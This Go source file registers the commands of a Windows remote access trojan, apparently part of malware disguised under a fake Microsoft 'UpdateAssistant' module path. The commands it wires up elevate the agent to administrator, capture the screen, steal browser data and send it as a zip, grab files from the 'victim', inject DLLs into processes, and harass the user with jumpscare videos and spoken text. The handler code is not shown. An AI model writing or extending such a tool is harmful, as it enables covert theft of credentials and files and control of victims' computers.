//go:build windows

package commands

import (
	"github.com/microsoft/UpdateAssistant/modules/commands/media"
	"github.com/microsoft/UpdateAssistant/modules/commands/stealer"
	"github.com/microsoft/UpdateAssistant/modules/commands/system"
	"github.com/microsoft/UpdateAssistant/modules/ipc"
)

func RegisterAllCommands(cmds *ipc.Commands) {
	cmds.AddCommand("admin", "elevate agent to administrator", "system", system.Admin)

	cmds.AddCommand("ss", "capture the host screen", "media", media.Run)
	cmds.AddCommand("share", "read and send a file", "media", media.Share)
	cmds.AddCommand("steal", "steal browser data and send as zip", "stealer", stealer.Stealer)
	cmds.AddCommand("note", "write a note and open it on the victim", "media", media.Note)
	cmds.AddCommand("speak", "speak text aloud on the victim", "media", media.Speak)
	cmds.AddCommand("scare", "fullscreen jumpscare video on victim", "media", media.Scare)
	cmds.AddCommand("file", "grab juicy files from victim", "system", system.HandleFileGrab)
	cmds.AddCommand("inject", "inject a dll into a process", "system", system.HandleInject)
}
